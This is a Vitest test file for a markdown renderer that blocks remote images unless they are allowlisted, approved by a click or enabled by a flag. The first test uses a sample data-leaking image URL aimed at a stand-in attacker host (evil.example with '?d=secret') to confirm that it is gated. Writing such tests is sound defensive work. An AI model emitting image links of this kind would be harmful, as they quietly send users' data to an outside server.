import { describe, expect, it } from 'vitest'
import { renderMarkdown } from './markdown'

describe('renderMarkdown: imagens remotas', () => {
  it('imagem fora do allowlist vira gate, sem <img', async () => {
    const html = await renderMarkdown('![leak](https://evil.example/x.png?d=secret)')
    expect(html).not.toContain('<img')
    expect(html).toContain('data-img-gate')
    expect(html).toContain('Image from evil.example')
    expect(html).toContain('Load image')
  })

  it('URL no allowlist vira <img, inclusive com diferença só de normalização', async () => {
    const exact = await renderMarkdown('![a](https://img.example/a.png)', {
      allowedImageUrls: ['https://img.example/a.png'],
    })
    expect(exact).toContain('<img')
    expect(exact).not.toContain('data-img-gate')

    const normalized = await renderMarkdown('![b](https://IMG.example/b.png)', {
      allowedImageUrls: ['https://img.example:443/b.png'],
    })
    expect(normalized).toContain('<img')
    expect(normalized).not.toContain('data-img-gate')
  })

  it('allowRemoteImages: true vira <img', async () => {
    const html = await renderMarkdown('![doc](https://docs.example/fig.png)', { allowRemoteImages: true })
    expect(html).toContain('<img')
    expect(html).not.toContain('data-img-gate')
  })

  it('localhost dá o texto de bloqueio', async () => {
    const html = await renderMarkdown('![x](http://localhost/x.png)')
    expect(html).not.toContain('<img')
    expect(html).toContain('Image blocked: local network address')
  })

  it('o clique em "Load image" mostra a imagem e aprova a URL na sessão', async () => {
    const url = 'https://click.example/photo.png'
    const container = document.createElement('div')
    container.innerHTML = await renderMarkdown(`![photo](${url})`)
    document.body.appendChild(container)
    try {
      const button = container.querySelector<HTMLButtonElement>('[data-img-load]')
      expect(button).not.toBeNull()
      button!.click()

      const img = container.querySelector('img')
      expect(img).not.toBeNull()
      expect(img!.getAttribute('src')).toBe(url)
      expect(img!.getAttribute('alt')).toBe('photo')
      expect(container.querySelector('[data-img-gate]')).toBeNull()

      const again = await renderMarkdown(`![photo](${url})`)
      expect(again).toContain('<img')
      expect(again).not.toContain('data-img-gate')
    } finally {
      container.remove()
    }
  })
})
